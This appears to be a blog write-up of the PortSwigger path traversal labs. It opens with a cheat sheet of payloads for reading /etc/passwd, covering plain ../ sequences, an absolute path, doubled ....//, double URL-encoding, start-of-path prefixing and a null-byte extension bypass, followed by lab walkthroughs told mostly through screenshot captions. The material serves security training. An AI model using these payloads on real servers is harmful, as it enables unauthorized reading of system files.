---
layout: single
title: Path Traversal - PortSwigger
excerpt: "All Path Traversal labs of PortSwigger."
date: 2025-09-25
classes: wide
header:
  teaser: /img2/images/portswigger.png
  teaser_home_page: true
  icon: /img2/images/burp.jpg
categories:
  - portswigger
  - Web
tags:
  - Burpsuite
  - Path Traversal
  - LFI
---


## Path Traversal Cheet Sheat

- Agartha Burp Extension 

![](/img2/Pasted%20image%2020250908204757.png)

- Simple Case

```http
../../../../../../../../../../../etc/passwd
```

- Absolute Path

```http
/etc/passwd
```

- Doble `../`

```http
....//....//....//....//....//....//etc/passwd
```

- Doble URL-Encode `../`

```http
%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65/etc/passwd
```

- Validation of start of path

```http
/var/www/images/../../../../../../etc/passwd
```

- Null Byte

```http
../../../../../../../etc/passwd%00.jpg
```

## Bypass absoluto con secuencias bloqueadas || File path traversal, traversal sequences blocked with absolute path bypass

![](/img2/Pasted%20image%2020250908204503.png)

> If we try to do Path Traversal we see that the server does not interpret the file.

![](/img2/Pasted%20image%2020250908204437.png)

> When using the absolute path the server does return the file contents.

## Secuencias traversal eliminadas sin recursión || File path traversal, traversal sequences stripped non-recursively

![](/img2/Pasted%20image%2020250925122145.png)

> We test the basic payload and see that we do not pass validation.

![](/img2/Pasted%20image%2020250925122108.png)

> To bypass the block we can make use of double `../`

## Bypass con doble decodificación en URL || File path traversal, traversal sequences stripped with superfluous URL-decode

![](/img2/Pasted%20image%2020250908202939.png)

> We test the basic LFI payload and see that it is not being interpreted.

![](/img2/Pasted%20image%2020250908203057.png)

> With the Agartha extension we create a wordlist with different payloads.

![](/img2/Pasted%20image%2020250908203146.png)

![](/img2/Pasted%20image%2020250908203224.png)

> With a double URL-encode we bypass the restriction.

## Validación del inicio de la ruta || File path traversal, validation of start of path

![](/img2/Pasted%20image%2020250925123639.png)

> We see the server loading an image with the absolute path.

![](/img2/Pasted%20image%2020250925123739.png)

> If we try to do a Path Traversal after the jpg file, we see the server does not return the contents of `/etc/passwd`.

![](/img2/Pasted%20image%2020250925123440.png)

> If we do the same but from the images directory, we see that it does allow us to read the contents of `/etc/passwd`.

## Bypass con null byte y validación de extensión || File path traversal, validation of file extension with null byte bypass

![](/img2/Pasted%20image%2020250925124201.png)

> We try to inject the basic payload and see that the server does not allow us to read the contents of `/etc/passwd`

![](/img2/Pasted%20image%2020250925124113.png)

> To be able to read the contents we can make use of null bytes. Null bytes allow disabling the final extension, so if there is a validation that forces loading .jpg files, we will be tricking the server.
